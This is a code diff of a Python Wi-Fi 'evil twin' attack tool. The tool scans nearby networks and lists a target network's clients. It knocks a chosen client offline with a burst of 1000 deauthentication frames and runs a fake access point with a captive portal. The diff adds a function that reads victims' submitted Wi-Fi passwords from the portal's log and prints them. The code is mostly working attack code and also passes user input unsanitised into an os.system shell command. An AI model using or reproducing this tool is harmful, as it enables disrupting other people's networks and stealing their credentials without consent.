@@ -11,9 +11,13 @@ import os
 from loguru import logger
 from subprocess import run
 from simple_term_menu import TerminalMenu
+from functools import wraps
 
+OUTPUT_PATH = os.path.join("captive_portal", "nohup.out")
 # initialize the networks dataframe that will contain all access points nearby
-networks = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"])
+networks = pandas.DataFrame(
+    columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Crypto"]
+)
 # set the index BSSID (MAC address of the AP)
 networks.set_index("BSSID", inplace=True)
 
@@ -21,20 +25,49 @@ isSniffing = True
 isPrinting = True
 check_fake_ap_connections = True
 
-bssid_to_scan = ''
+bssid_to_scan = ""
 clients = set()
+
+
+def retry_on_error(max_retries):
+    def decorator_func(func):
+        @wraps(func)
+        def wrapper(*args, **kwargs):
+            attempts = 0
+            while attempts < max_retries:
+                try:
+                    result = func(*args, **kwargs)
+                    if len(result) > 0:
+                        return result
+                    time.sleep(0.5)
+                    attempts += 1
+                except Exception as e:
+                    print(f"Error: {e}")
+                    attempts += 1
+                    print(f"Retrying... ({attempts}/{max_retries})")
+                    time.sleep(1)
+            raise Exception(f"Failed after {max_retries} attempts")
+        return wrapper
+    return decorator_func
+
 
 # check for connection on the fake ap
 def check_for_connection():
     conn = []
     while check_fake_ap_connections:
-        out = run("systemctl status hostapd | grep \"starting accounting session\"", capture_output=True, shell=True, text=True).stdout
+        out = run(
+            'systemctl status hostapd | grep "starting accounting session"',
+            capture_output=True,
+            shell=True,
+            text=True,
+        ).stdout
         for line in out.splitlines():
             client_mac = line.split()[7]
             if client_mac not in conn:
                 conn.append(client_mac)
                 logger.info(f"\n{client_mac} Client connected!")
         time.sleep(1)
+
 
 def callback(packet):
     if packet.haslayer(Dot11Beacon):
@@ -106,8 +139,22 @@ def deauth_target(target_mac, twin_mac):
     sendp(pkt, inter=0.1, count=1000, iface=conf.iface, verbose=1)
 
 
-if __name__ == "__main__":
+@retry_on_error(3)
+def read_nohup_output():
+    received_passwords = set()
 
+    if not os.path.exists(OUTPUT_PATH):
+        return received_passwords
+
+    with open(OUTPUT_PATH, "r") as f:
+        for line in f:
+            if "This is the password" in line:
+                received_passwords.add(line.split("This is the password")[-1])
+
+    return received_passwords
+
+
+if __name__ == "__main__":
     conf.iface = os.getenv("ATTACK_INTERFACE")
     logger.info(f"using interface: {conf.iface}")
 
@@ -127,11 +174,10 @@ if __name__ == "__main__":
     ssid_to_scan = input()
     bssid_to_scan = networks[networks["SSID"] == ssid_to_scan].index[0]
 
-    logger.info(f'Start scanning clients on \"{ssid_to_scan}\" {bssid_to_scan}')
+    logger.info(f'Start scanning clients on "{ssid_to_scan}" {bssid_to_scan}')
     sniff(prn=get_AP_clients, monitor=True, timeout=20)
-    isSniffing = False # for the change_channel thread
+    isSniffing = False  # for the change_channel thread
 
-    
     os.system(f"./rerouting_magic.sh --ssid {ssid_to_scan}")
 
     # start the thread that prints all the connected clients
@@ -140,7 +186,7 @@ if __name__ == "__main__":
     printer.start()
 
     logger.info("please choose a client MAC to deauth: ")
-    # clients set to list 
+    # clients set to list
     clients = list(clients)
     terminal_menu = TerminalMenu(clients)
     choice_index = terminal_menu.show()
@@ -151,6 +197,7 @@ if __name__ == "__main__":
     check_fake_ap_connections = False
 
     # TODO: print the ap password
-    
 
+    result = read_nohup_output()
+    print(result)
     # pdb.set_trace()
